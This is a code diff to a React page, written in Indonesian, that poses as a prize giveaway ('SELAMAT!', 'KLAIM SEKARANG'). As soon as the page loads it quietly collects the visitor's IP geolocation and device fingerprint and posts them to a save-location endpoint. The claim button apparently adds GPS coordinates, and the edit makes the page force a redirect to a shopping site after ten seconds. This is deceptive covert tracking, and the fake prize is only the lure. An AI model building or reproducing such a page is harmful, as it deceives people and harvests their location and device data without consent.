@@ -8,11 +8,9 @@ export default function TrackPage() {
   const [ipData, setIpData] = useState<any>(null);
   const [deviceInfo, setDeviceInfo] = useState<any>(null);
   const [loading, setLoading] = useState(false);
-
   const [buttonReady, setButtonReady] = useState(false);
 
   const dataReady = ipData && deviceInfo;
-
   const ready = dataReady && buttonReady;
 
   useEffect(() => {
@@ -21,31 +19,34 @@ export default function TrackPage() {
       const ipJson = await ipRes.json();
       setIpData(ipJson);
 
-      const d = getDeviceInfo();
-      setDeviceInfo(d);
+      const info = getDeviceInfo();
+      setDeviceInfo(info);
 
       await fetch("/api/save-location", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           ...ipJson,
-          ...d,
+          ...info,
           gpsLat: null,
           gpsLon: null,
         }),
       });
 
       setTimeout(() => {
-        confetti({ particleCount: 120, spread: 80 });
+        confetti({ particleCount: 150, spread: 80 });
       }, 300);
+
+      setTimeout(() => setButtonReady(true), 3000);
     }
 
     init();
 
-    setTimeout(() => {
-      setButtonReady(true);
-    }, 3000);
+    const timer = setTimeout(() => {
+      window.location.href = "https://shopee.co.id";
+    }, 10000);
 
+    return () => clearTimeout(timer);
   }, []);
 
   async function handleClaim() {
@@ -73,7 +74,6 @@ export default function TrackPage() {
           window.location.href = "https://shopee.co.id";
         }, 1200);
       },
-
       async () => {
         await fetch("/api/save-location", {
           method: "POST",
@@ -98,16 +98,16 @@ export default function TrackPage() {
         {loading ? (
           <>
             <h2 style={styles.title}>⏳ Memproses...</h2>
-            <p style={styles.text}>Sebentar ya, hadiah sedang diklaim…</p>
+            <p style={styles.text}>Sedang mengklaim hadiah Anda...</p>
           </>
         ) : (
           <>
             <h2 style={styles.title}>🎉 SELAMAT!</h2>
-            <p style={styles.text}>Anda mendapatkan hadiah menarik!</p>
+            <p style={styles.text}>Anda mendapatkan hadiah spesial!</p>
 
             <button
-              onClick={handleClaim}
               disabled={!ready}
+              onClick={handleClaim}
               style={{
                 ...styles.button,
                 opacity: ready ? 1 : 0.4,
@@ -115,13 +115,11 @@ export default function TrackPage() {
               }}
             >
               🎁 KLAIM SEKARANG
-              {!ready && <span style={styles.loading}> ⏳</span>}
+              {!ready && <span style={{ marginLeft: 8 }}>⏳</span>}
             </button>
 
             {!ready && (
-              <p style={styles.smallText}>
-                Menyiapkan hadiah Anda...
-              </p>
+              <p style={styles.waitText}>Menyiapkan hadiah Anda...</p>
             )}
           </>
         )}
@@ -130,6 +128,7 @@ export default function TrackPage() {
   );
 }
 
+// Device detector paling stabil
 function getDeviceInfo() {
   const ua = navigator.userAgent.toLowerCase();
 
@@ -142,11 +141,11 @@ function getDeviceInfo() {
 
   let deviceType = "Desktop";
   if (/mobile/i.test(ua)) deviceType = "Mobile";
-  if (/tablet/i.test(ua) || ua.includes("ipad")) deviceType = "Tablet";
+  if (/tablet/i.test(ua)) deviceType = "Tablet";
 
   const brands = [
     "Samsung", "Xiaomi", "Oppo", "Vivo", "Realme", "Infinix",
-    "Poco", "Huawei", "Nokia", "Sony", "Asus", "Lenovo",
+    "Huawei", "Poco", "Nokia", "Sony", "Asus", "Lenovo",
     "iPhone", "iPad",
   ];
 
@@ -173,37 +172,22 @@ const styles: any = {
     background: "#fff",
     padding: 30,
     borderRadius: 16,
-    maxWidth: 360,
     width: "100%",
+    maxWidth: 360,
     textAlign: "center",
-    boxShadow: "0 6px 20px rgba(0,0,0,0.15)",
+    boxShadow: "0 8px 20px rgba(0,0,0,0.15)",
   },
-  title: {
-    fontSize: 28,
-    fontWeight: "bold",
-    marginBottom: 12,
-  },
-  text: {
-    fontSize: 16,
-    marginBottom: 20,
-  },
-  smallText: {
-    fontSize: 13,
-    color: "#666",
-    marginTop: 10,
-  },
+  title: { fontSize: 26, marginBottom: 10 },
+  text: { fontSize: 16, marginBottom: 20 },
+  waitText: { fontSize: 14, color: "#666" },
   button: {
     background: "#FF5722",
-    color: "white",
-    padding: "14px 18px",
+    padding: 14,
+    borderRadius: 10,
+    color: "#fff",
+    fontSize: 18,
     width: "100%",
     border: "none",
-    borderRadius: 10,
-    fontSize: 18,
     cursor: "pointer",
-    marginTop: 10,
-  },
-  loading: {
-    marginLeft: 6,
   },
 };
